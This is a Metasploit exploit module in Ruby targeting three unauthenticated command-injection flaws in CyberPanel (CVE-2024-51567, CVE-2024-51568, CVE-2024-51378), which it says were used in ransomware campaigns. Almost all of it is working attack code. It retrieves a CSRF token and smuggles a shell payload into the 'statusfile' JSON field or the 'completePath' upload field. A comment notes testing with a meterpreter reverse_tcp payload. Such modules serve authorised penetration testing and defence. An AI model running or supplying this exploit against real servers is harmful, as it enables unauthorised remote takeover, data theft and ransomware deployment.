##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Module::HasActions
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CyberPanel Multi CVE Pre-auth RCE',
        'Description' => %q{
          This module exploits three separate unauthenticated Remote Code Execution vulnerabilities in CyberPanel:

          - CVE-2024-51567: Command injection vulnerability in the "upgrademysqlstatus" endpoint.
          - CVE-2024-51568: Command Injection via the "completePath" parameter in the "outputExecutioner" sink.
          - CVE-2024-51378: Unauthenticated RCE in "/ftp/getresetstatus" and "/dns/getresetstatus".

          These vulnerabilities were exploited in ransomware campaigns affecting over 22,000 CyberPanel instances, with the PSAUX ransomware being the primary actor in these attacks.
        },
        'Author' => [
          'DreyAnd',               # Vulnerability discovery (CVE-2024-51567-8)
          'Valentin Lobstein',     # Metasploit Module
          'Luka Petrovic (refr4g)' # Vulnerability discovery (CVE-2024-51378)
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-51567'],
          ['CVE', '2024-51568'],
          ['CVE', '2024-51378'],
          ['URL', 'https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce'],
          ['URL', 'https://refr4g.github.io/posts/cyberpanel-command-injection-vulnerability/'],
          ['URL', 'https://github.com/DreyAnd/CyberPanel-RCE'],
          ['URL', 'https://github.com/refr4g/CVE-2024-51378'],
          ['URL', 'https://www.bleepingcomputer.com/news/security/massive-psaux-ransomware-attack-targets-22-000-cyberpanel-instances/'],
          ['URL', 'https://gist.github.com/gboddin/d78823245b518edd54bfc2301c5f8882']
        ],
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command Shell', {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2024-10-27',
        'Actions' => [
          ['CVE-2024-51567', { 'Description' => 'Exploit using CVE-2024-51567' }],
          ['CVE-2024-51568', { 'Description' => 'Exploit using CVE-2024-51568' }],
          ['CVE-2024-51378', { 'Description' => 'Exploit using CVE-2024-51378' }]
        ],
        'DefaultAction' => 'CVE-2024-51567',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(8090)
    ])
  end

  def exploit
    case action.name.downcase
    when 'cve-2024-51567'
      execute_status_update('dataBases/upgrademysqlstatus')
    when 'cve-2024-51568'
      execute_filemanager_upload
    when 'cve-2024-51378'
      execute_status_update("#{['ftp', 'dns'].sample}/getresetstatus")
    else
      fail_with(Failure::BadConfig, 'Invalid ACTION selected')
    end
  end

  def execute_status_update(endpoint)
    payload_data = '{"statusfile": "/dev/null;%s #"}' % payload.encoded

    send_request_cgi({
      'method' => 'OPTIONS',
      'uri' => normalize_uri(target_uri.path, endpoint),
      'data' => payload_data,
      'headers' => {
        'Content-Type' => 'application/json',
        'X-CSRFToken' => get_csrf_token
      }
    }, 0)
  end

  def execute_filemanager_upload
    csrf_token = get_csrf_token

    post_data = Rex::MIME::Message.new

    random_domain = Rex::Text.rand_text_alphanumeric(8)

    random_complete_path = "/dev/null;#{payload.encoded} #"

    random_filename = "#{Rex::Text.rand_text_alphanumeric(6)}.txt"
    random_content = Rex::Text.rand_text_alphanumeric(4)

    post_data.add_part(random_domain, nil, nil, 'form-data; name="domainName"')
    post_data.add_part(random_complete_path, nil, nil, 'form-data; name="completePath"')
    post_data.add_part(random_content, 'text/plain', nil, "form-data; name=\"file\"; filename=\"#{random_filename}\"")

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'filemanager', 'upload'),
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'headers' => {
        'X-CSRFToken' => csrf_token,
        'Cookie' => "csrftoken=#{csrf_token}"
      },
      'data' => post_data.to_s
    }, 0)
  end

  def get_csrf_token
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })

    csrf_token = res.get_cookies.match(/csrftoken=(\w+)/)&.captures&.first
    fail_with(Failure::NotFound, 'Unable to retrieve CSRF token.') unless csrf_token
    print_status("CSRF Token retrieved: #{csrf_token}")
    csrf_token
  end
end
